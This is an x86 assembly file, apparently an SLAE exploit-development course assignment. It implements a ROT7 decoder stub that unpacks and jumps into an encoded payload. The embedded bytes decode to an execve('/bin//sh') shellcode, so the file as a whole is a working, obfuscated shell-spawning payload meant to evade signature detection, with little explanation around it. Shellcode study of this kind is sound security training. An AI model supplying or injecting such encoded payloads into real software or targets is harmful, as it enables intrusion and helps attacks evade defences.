; SLAE Assignment 6: ROT7 decoder (morphed)
; http://shell-storm.org/shellcode/files/shellcode-900.php
; Original Shellcode Length: 74
; Morphed Shellcode Length:  54

global _start
section .text
_start:
	jmp short stage

decoder:
	pop esi						; shellcode address
	mov al, byte [esi]			; shellcode length
	xor ecx, ecx 				; position

decode:
	mov bl, byte [esi+ecx+1]	; get rot'ed byted
	sub bl, 0x7					; rot it back (-7)
	mov byte [esi+ecx], bl		; store it in shellcode
	inc ecx						; next position
	cmp al, cl					; check if reached the end of shellcode
	jnz short decode 			; 	if not, continue derot'ing
	jmp shellcode				;	else, execute derot'ed shellcode

stage:
	call decoder
	
	; Shellcode Format: 
	; 	byte[0] 	= length of shellcode (max 0xff)
	;	byte[1..] 	= rot'ed shellcode
	shellcode: db 0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87
